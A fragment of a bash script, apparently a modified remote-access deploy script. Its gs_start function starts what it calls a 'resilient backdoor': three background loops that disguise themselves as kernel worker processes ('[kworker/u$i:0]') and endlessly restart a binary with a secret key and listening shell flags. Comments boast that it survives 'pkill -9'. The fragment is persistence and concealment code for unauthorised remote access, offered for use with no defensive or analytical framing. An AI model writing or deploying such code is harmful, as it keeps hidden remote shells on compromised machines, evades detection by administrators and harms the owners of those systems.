...
gs_start()
{
	...
	if [[ -n "$IS_NEED_START" ]]; then
		...
		# and then executed.
		echo -e "${CW}Starting resilient backdoor with infinite loop...${CN}"
# Multi-layer resilient start
# SIMPLE BUT EFFECTIVE - survives pkill -9 defunct
# DEBUG VERSION - See what's happening
for i in 1 2 3; do
    (
        exec -a "[kworker/u$i:0]" bash -c '
            cd "$1"
            FAIL_COUNT=0
            RESTART_COUNT=0
            ...
            while :; do
                ...
                # EVERY 100 RESTARTS: Fresh shell to avoid memory leaks
                if [ $RESTART_COUNT -ge 100 ]; then
                    exec "$0" "$@"
                fi
                
                # EVERY 10 RESTARTS: Small cleanup
                ...
                # Run binary
                if ! timeout 30 "$2" -s "$3" -liD; then
                    FAIL_COUNT=$((FAIL_COUNT + 1))
                    
                    # Smart backoff based on failures
                    ...
                    # Normal exit
                    sleep 0.$((500 + RANDOM % 500))
                    FAIL_COUNT=0
                fi
            done
        ' _ "$HOME" "$DSTBIN" "$GS_SECRET" &
    ) 2>/dev/null
    sleep 0.1
done
